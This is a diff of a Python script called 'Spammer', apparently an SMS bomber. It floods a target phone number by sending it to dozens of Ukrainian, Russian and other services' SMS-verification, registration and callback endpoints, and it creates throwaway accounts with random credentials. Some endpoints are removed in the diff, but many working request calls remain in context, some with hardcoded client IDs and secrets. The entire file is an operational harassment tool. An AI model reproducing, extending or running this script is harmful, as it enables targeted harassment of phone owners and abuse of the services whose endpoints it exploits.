@@ -1,9 +1,7 @@
 #!/usr/bin/python3
 # Spammer
 # Author: milkpro
-import random, time, os
-try: import requests
-except: os.system("pip install requests")
+import requests, random, time, os
 def main():
   os.system('cls' if os.name=='nt' else 'clear')
   logo = "\033[32m┏━┓\n┃━╋━┳━┓┏━━┳━━┳━┳┳┓\n┣━┃╋┃╋┗┫┃┃┃┃┃┃┻┫┏┛\n┗━┫┏┻━━┻┻┻┻┻┻┻━┻┛\033[0m by clud1x\n\033[32m  ┗┛\n\033[0m"
@@ -25,12 +23,10 @@ def main():
     time.sleep(2)
     main()
   _name = ""
-  russian_name = ""
   for x in range(12):
     _name = _name + random.choice(list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"))
     password = _name + random.choice(list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"))
     username = _name + random.choice(list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"))
-    russian_name = russian_name + random.choice(list("АаБбВвГгДдЕеЁёЖжЗзИиЙйКкЛлМмНнОоПпРрСсТтУуФфХхЦцЧчШшЩщЪъЫыЬьЭэЮюЯя"))
   _phone9 = _phone[1:]
   _phoneAresBank = "+"+ _phone[0]+"("+ _phone[1:4]+")"+ _phone[4:7]+"-"+ _phone[7:9]+"-"+ _phone[9:11]
   _phone9dostavista =  _phone9[:3]+"+"+ _phone9[3:6]+"-"+ _phone9[6:8]+"-"+ _phone9[8:10]
@@ -357,70 +353,6 @@ def main():
       except:
         pass
       try:
-        requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone})
-      except:
-        pass
-      try:
-        requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": _phone})
-      except:
-        pass
-      try:
-        requests.post("https://api.easypay.ua/api/auth/register", json={"phone": _phone, "password": _name})
-      except:
-        pass
-      try:
-        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
-      except:
-        pass
-      try:
-        requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html", data={"phone": _phone, "do": "phone"})
-      except:
-        pass
-      try:
-        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html", data={"user_info[fullname]": name, "user_info[phone]": _phone, "user_info[email]": email, "user_info[password]": name, "user_info[conf_password]": name})
-      except:
-        pass
-      try:
-        requests.post("https://mobileplanet.ua/register", data={"klient_name": name, "klient_phone": "+" + _phone, "klient_email": email})
-      except:
-        pass
-      try:
-        requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+" + _phone})
-      except:
-        pass
-      try:
-        requests.post("https://www.moyo.ua/identity/registration", data={"firstname": name, "phone": _phone, "email": email})
-      except:
-        pass
-      try:
-        requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
-      except:
-        pass
-      try:
-        requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": _phone, "registration": "N"})
-      except:
-        pass
-      try:
-        requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone})
-      except:
-        pass
-      try:
-        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone})
-      except:
-        pass
-      try:
-        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
-      except:
-        pass
-      try:
-        requests.post("https://www.uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
-      except:
-        pass
-      try:
-        requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/", data={"success_url": "", "error_url": "", "is_subscribed": "0", "firstname": name, "lastname": name, "email": email, "password":name, "password_confirmation": name, "telephone": _phone})
-      except:
-        pass
-      try:
         requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": _phone, "platform": "PISWeb"})
       except:
         pass
@@ -441,15 +373,7 @@ def main():
       except:
         pass
       try:
-        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": _phone})
-      except:
-        pass
-      try:
         requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + _phone})
-      except:
-        pass
-      try:
-        requests.get("https://api.eldorado.ua/v1/sign/", params={"login": _phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru"})
       except:
         pass
       try:
@@ -461,19 +385,11 @@ def main():
       except:
         pass
       try:
-        requests.post("https://www.flipkart.com/api/6/user/signup/status", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"}, json={"loginId": "+" + _phone, "supportAllStates": True})
-      except:
-        pass
-      try:
         requests.get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": _phone, "g-recaptcha-response": ""})
       except:
         pass
       try:
         requests.post("https://friendsclub.ru/assets/components/pl/connector.php", data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
-      except:
-        pass
-      try:
-        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
       except:
         pass
       try:
@@ -497,14 +413,6 @@ def main():
       except:
         pass
       try:
-        requests.post("https://izi.ua/api/auth/register", json={"phone": "+" + _phone, "name": name, "is_terms_accepted": True})
-      except:
-        pass
-      try:
-        requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
-      except:
-        pass
-      try:
         requests.post("https://kaspi.kz/util/send-app-link", data={"address": _phone})
       except:
         pass
@@ -517,10 +425,6 @@ def main():
       except:
         pass
       try:
-        requests.post("https://loany.com.ua/funct/ajax/registration/code", data={"phone": _phone})
-      except:
-        pass
-      try:
         requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": _phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
       except:
         pass
@@ -530,10 +434,6 @@ def main():
         pass
       try:
         requests.get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": _phone, "phone_number": "1"})
-      except:
-        pass
-      try:
-        requests.get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + _phone,})
       except:
         pass
       try:
@@ -550,18 +450,6 @@ def main():
         pass
       try:
         requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": _phone})
-      except:
-        pass
-      try:
-        requests.post("https://shafa.ua/api/v3/graphiql", json={"operationName": "RegistrationSendSms", "variables": {"phoneNumber": "+" + _phone}, "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"})
-      except:
-        pass
-      try:
-        requests.post("https://shafa.ua/api/v3/graphiql", json={"operationName": "sendResetPasswordSms", "variables": {"phoneNumber": "+" + _phone}, "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
-      except:
-        pass
-      try:
-        requests.get("https://auth.pizza33.ua/ua/join/check/", params={"callback": "angular.callbacks._1", "email": email, "password": password, "phone": _phone, "utm_current_visit_started": 0, "utm_first_visit": 0, "utm_previous_visit": 0, "utm_times_visited": 0})
       except:
         pass
       try:
@@ -585,14 +473,6 @@ def main():
       except:
         pass
       try:
-        requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
-      except:
-        pass
-      try:
-        requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
-      except:
-        pass
-      try:
         requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start", json={"phone": "+" + _phone, "first_name": "-", "utm_data": {}, "via": "call"})
       except:
         pass
@@ -606,10 +486,6 @@ def main():
         pass
       try:
         requests.get("https://vezitaxi.com/api/employment/getsmscode", params={"phone": "+" + _phone, "city": 561, "callback": "jsonp_callback_35979"})
-      except:
-        pass
-      try:
-        requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": russian_name, "firstName": russian_name, "middleName": russian_name, "mobilePhone": formatted_phone, "email": email, "smsCode": ""})
       except:
         pass
       iteration += 1
